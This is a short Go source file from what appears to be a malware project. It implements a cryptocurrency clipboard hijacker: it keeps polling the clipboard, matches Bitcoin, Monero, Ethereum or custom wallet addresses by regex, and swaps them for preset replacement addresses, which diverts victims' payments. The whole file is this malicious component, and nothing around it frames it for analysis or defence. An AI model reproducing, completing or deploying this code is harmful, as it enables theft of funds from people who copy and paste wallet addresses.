package core

import (
	"regexp"
	"time"
)

func validateAdd(add string) (bool, string) {
	for crypto, regex := range CryptoRegex {
		re := regexp.MustCompile(regex)
		match := re.MatchString(add)
		if match {
			return match, crypto
		}
	}
	return false, ""
}

func ClipperLoop() {
	for ClipperState {
		clip, _ := ReadClipboard()
		match, crypto := validateAdd(clip)
		if match {
			if crypto == "btc" {
				if BTC != "" {
					_ = WriteClipboard(BTC)
				}
			} else if crypto == "xmr" {
				if XMR != "" {
					_ = WriteClipboard(XMR)
				}
			} else if crypto == "eth" {
				if ETH != "" {
					_ = WriteClipboard(ETH)
				}
			} else if crypto == "custom" {
				if Custom != "" {
					_ = WriteClipboard(Custom)
				}
			}
		}
	}
	time.Sleep(100 * time.Millisecond)
}
